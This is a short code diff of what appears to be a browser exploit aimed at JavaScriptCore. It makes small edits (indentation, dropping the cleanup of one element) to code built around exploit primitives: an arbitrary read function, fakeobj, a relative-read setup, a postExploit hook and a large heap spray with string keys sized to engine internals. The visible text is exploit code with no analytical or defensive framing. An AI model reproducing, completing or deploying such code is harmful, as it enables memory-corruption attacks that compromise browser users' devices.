@@ -119,7 +119,7 @@ function setupRW() {
 	/* ... */
 	if(window.postExploit)
 		window.postExploit();
-}
+		}
 
 function read(addr, length) {
 	for (let i = 0; i < 8; i++)
@@ -156,8 +156,6 @@ function fakeobj(addr) {
 }
 
 function cleanup() {
-	select1.remove();
-	select1 = null;
 	input1.remove();
 	input1 = null;
 	input2.remove();
@@ -201,7 +199,7 @@ function leakJSC() {
 	if (g_relative_read === null)
 		die("[!] Failed to setup a relative read primitive");
 
-        var tmp_spray = {};
+		var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
                 tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + (''+i).padStart(5, '0')] = 0x1337;
 
